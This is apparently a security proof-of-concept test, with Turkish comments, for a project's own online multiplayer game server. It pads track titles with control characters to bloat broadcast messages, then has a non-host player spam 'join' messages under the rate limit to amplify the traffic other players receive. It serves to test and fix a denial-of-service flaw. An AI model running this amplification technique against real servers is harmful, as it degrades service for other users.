// PoC: Shazam online — kötü niyetli host 300 "şişirilmiş" şarkı ekler; oyun başlayınca her `view` mesajı tüm `pool`u taşır.
// Sonra sıradan bir oyuncu (host değil) kendi odasına tekrar tekrar `join` göndererek (reconnect → broadcast) herkese
// bu dev görünümü yeniden yollatır. Ölçülen: tek view boyutu ve kurbanın 10 sn'de aldığı bayt.
// Kullanım: node tests/security/poc-shazam-amplify.mjs
import { startServer } from '../lib/server.js';
import { makeRoom, sleep } from '../lib/bot.js';

const srv = await startServer({ timeScale: 1 });
const { bots, host, code } = await makeRoom(srv.wsUrl, 'shazam', 3, 'P');
const [, victim, attacker] = bots;

// JSON'da \u0001 → 6 bayt; text() sadece kod noktası sayar (200), kontrol karakterlerini atmaz.
const pad = '\u0001'.repeat(196);
const mk = (i) => ({ title: `t${i}${pad}`, artist: `a${i}${pad}`, audio: 'https://p.scdn.co/mp3-preview/x' });
let n = 0;
for (let msg = 0; n < 300; msg++) {
  const tracks = [mk(n++), mk(n++), mk(n++)];
  const raw = JSON.stringify({ t: 'prep', data: { op: 'add', tracks } });
  if (msg === 0) console.log(`prep mesajı: ${raw.length} bayt (sınır 8192)`);
  host.sendRaw(raw);
  if (msg % 25 === 24) await sleep(5200); // bağlantı başına 30 mesaj / 5 sn
}
await host.waitRoom((r) => r.prep?.trackCount >= 300, { timeout: 20000 });
console.log('odadaki şarkı:', host.room.prep.trackCount);
host.send({ t: 'start' });
await victim.waitView((v) => v.phase === 'play');
const viewMsg = victim.messages.findLast((m) => m.t === 'view');
console.log(`tek view mesajı: ${(viewMsg.bytes / 1024).toFixed(0)} KB, pool: ${viewMsg.view.pool.length} öğe`);

// Saldırı: host olmayan oyuncu kendi odasına join → reconnect() → broadcast(room) (3 kişiye dev view)
let bytes = 0;
victim.taps.push((m) => { bytes += m.bytes; });
const t0 = Date.now();
while (Date.now() - t0 < 10_000) {
  for (let i = 0; i < 29; i++) attacker.send({ t: 'join', code });
  await sleep(5050);
}
console.log(`kurban 10 sn'de aldı: ${(bytes / 1024 / 1024).toFixed(1)} MB (tek saldırgan, ~6 mesaj/sn). 12 kişilik odada sunucu çıkışı ~12x.`);
bots.forEach((b) => b.close());
await srv.stop();
